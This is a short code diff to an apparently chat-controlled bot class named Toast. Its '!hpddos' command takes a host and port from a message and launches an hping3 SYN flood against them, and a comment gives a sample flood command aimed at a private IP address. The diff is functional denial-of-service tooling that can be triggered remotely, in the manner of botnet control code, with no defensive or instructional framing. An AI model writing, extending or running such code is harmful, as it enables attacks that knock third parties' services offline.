@@ -34,7 +34,8 @@ class Toast(BaseResponder):
 			# !hpddos 192.168.1.66
 			elif cmd == 'hpddos' and params:
 				host, port = params[0].split(':')
-				print(subprocess.check_output(['hping3', host, '--flood'])) #sudo?
+				#hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood 192.168.100.83
+				print(subprocess.check_output(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', port, '--flood', host])) #sudo?
 			elif cmd == 'quit':
 				self.respond(msg, command + ' ok')
 				self.respond(msg, 'Bye!')
